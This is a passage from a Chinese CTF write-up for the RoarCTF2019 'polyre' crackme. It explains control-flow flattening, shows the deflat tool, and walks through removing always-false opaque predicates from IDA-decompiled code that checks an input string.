class="line">get_bike();</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现平坦化了之后略微有一点点不可读，但是还能接受，但是它往往不会让你看的那么容易，因为它ch不可能就1，2，3，4这么给你弄好了，我再进一步加混淆。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">ch=(rain*<span class="number">2</span>+<span class="number">9876</span>)*<span class="number">9</span>+<span class="number">100</span>;</span><br><span class="line"><span class="keyword">switch</span>(ch)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">88984</span>：</span><br><span class="line">get_bike();</span><br><span class="line">ch=ch*<span class="number">9</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">89002</span>:</span><br><span class="line">get_umb();</span><br><span class="line">ch=(ch<span class="number">-18</span>)*<span class="number">9</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">800857</span>:</span><br><span class="line">get_bike();</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果块再多，运算再复杂，你可能都不能一眼看出来下不下雨和带不带伞是一个什么联系了。</p><p>然后switch再同如上的menu这样变换一下逻辑，就更难读了，也就是我们题目中看到的这个样子，可以发现，它平坦的块已经是特别密集了，疯狂while(1)然后中间条件判断去break。</p><p>以上分析均为自己个人理解，并使用自己最朴素的语言讲述出来的。</p><h3 id="抵抗控制流平坦化"><a href="#抵抗控制流平坦化" class="headerlink" title="抵抗控制流平坦化"></a>抵抗控制流平坦化</h3><p>既然有人研究出了这样的代码混淆，自然也有人研究出了对应的解法，这里放项目地址<a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p><p>该项目以angr作为依赖，在个人使用的时候我把它源码download下来还需要把它flat_control_flow目录下的deflat.py移动到上一层目录才能正常使用，使用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$python(3) deflat.py -f [file_name] --addr [function_addr]</span><br></pre></td></tr></table></figure><p>这里function_addr即为添加了此混淆的函数地址。放着跑个几分钟，就能跑出来一个控制流比较清晰的elf文件了。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/4.png" alt="4"></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>我们用ida反编译能得到以下代码</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &lt; <span class="number">10</span> || ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_43:</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v12 = v6;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[v6];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v15 = v14;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[v6];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v6 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v6 = v17;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v18 = i;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v19 = v18 &lt; <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v20 = s;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v28 = <span class="number">2</span> * v27;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v28;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v26 = v25;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v7 = v29 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * i;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">LABEL_55:</span><br><span class="line">      *(_QWORD *)v31 = v4;</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">    v32 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自习一看其实就发现其实它还是加了一些混淆，比如里面重复的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>这个表达式实际上是永远为假的，它因为dword_603058这个全局变量是在bss段上的，bss段上为未初始化的全局变量，所以它就是0。而且查一下它的交叉引用表也会发现与它相关的指令都是作为源操作数而非目的操作数，而且也没有取它地址做某些操作，在此基础之上我们基本可以认为它就是不变的。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/5.png" alt="5"></p><p>所以这去了混淆之后还有一百多行的代码其实是他自己手动疯狂加的混淆。所以这里直接把所有的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">do</span></span></span><br><span class="line"><span class="function">xxx</span></span><br><span class="line"><span class="function"><span class="title">while</span> <span class="params">( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span></span></span><br></pre></td></tr></table></figure><p>全部替换成xxx就好了，因为它只执行一次就退出了。</p><p>此外还有一些永为1的表达式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_603058 &lt; <span class="number">10</span> || ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这种情况下我我们直接把while循环去了，然后把这个语句之后在while循环语句内的所有语句都删了。</p><p>然后得到了以下的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//输入部分，碰到\n截止</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = v6;</span><br><span class="line">    v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[v6];</span><br><span class="line">    v15 = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[v6];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v6 + <span class="number">1</span>;</span><br><span class="line">    v6 = v17;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = i;</span><br><span class="line">    v19 = v18 &lt; <span class="number">6</span>;<span class="comment">//这里可以看出只有6组</span></span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v20 = s;</span><br><span class="line">    v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];<span class="comment">//转为了QWORD，每组八个字节</span></span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v7;</span><br><span class="line">      v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        v28 = <span 